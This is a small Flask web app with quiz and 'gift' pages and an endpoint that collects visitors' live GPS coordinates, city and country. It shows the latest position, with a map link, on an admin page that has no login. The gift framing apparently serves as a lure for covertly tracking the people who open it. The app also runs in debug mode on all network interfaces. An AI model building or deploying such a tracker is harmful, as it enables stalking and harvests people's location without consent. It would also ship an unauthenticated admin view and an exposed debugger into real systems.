from flask import Flask, render_template, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)

# Latest Live Location
latest_location = {
    "latitude": "",
    "longitude": "",
    "accuracy": "",
    "city": "",
    "state": "",
    "country": "",
    "maps": "",
    "last_update": ""
}


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/questions")
def questions():
    return render_template("questions.html")


@app.route("/gift")
def gift():
    return render_template("gift.html")


# ==========================
# Receive Live Location
# ==========================

@app.route("/update_location", methods=["POST"])
def update_location():

    global latest_location

    data = request.json

    latest_location = {
        "latitude": data.get("latitude"),
        "longitude": data.get("longitude"),
        "accuracy": data.get("accuracy"),
        "city": data.get("city"),
        "state": data.get("state"),
        "country": data.get("country"),
        "maps": f"https://www.google.com/maps?q={data.get('latitude')},{data.get('longitude')}",
        "last_update": datetime.now().strftime("%d-%m-%Y %I:%M:%S %p")
    }

    return jsonify({
        "success": True
    })


# ==========================
# Admin Location Page
# ==========================

@app.route("/admin/location")
def admin_location():

    return render_template(
        "admin_location.html",
        location=latest_location
    )


if __name__ == "__main__":

    app.run(

        host="0.0.0.0",

        port=int(os.environ.get("PORT",5000)),

        debug=True

    )